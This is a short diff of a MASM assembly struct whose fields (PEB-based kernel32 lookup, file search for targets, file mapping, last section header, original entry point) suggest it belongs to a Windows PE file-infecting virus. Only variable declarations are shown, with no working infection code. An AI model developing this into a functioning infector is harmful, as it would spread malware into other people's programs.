@@ -59,12 +59,12 @@ PEB ENDS
 ; Used to make the code a little bit cleaner
 
 STACK_STORAGE STRUCT
-    currentExe              BYTE MAX_PATH dup(?)
     targetName              BYTE MAX_PATH dup(?)
     fileStruct              WIN32_FIND_DATA <?>
     fileQueryHandle         HANDLE ?
     kernel32BaseAddr        HMODULE ?
     GetProcAddress_addr     DWORD ?
+    GetProcAddress_module   HMODULE ?
     fileHandle              HANDLE ?
     fileMappingHandle       HANDLE ?
     fileView                LPVOID ?
@@ -73,5 +73,6 @@ STACK_STORAGE STRUCT
     fileLastSectionHeader   LPVOID ?
     offsetToDest            DWORD ?
     origEntryPoint          DWORD ?
+    sizeWithAlignment       WORD ?
 STACK_STORAGE ENDS
 ;;
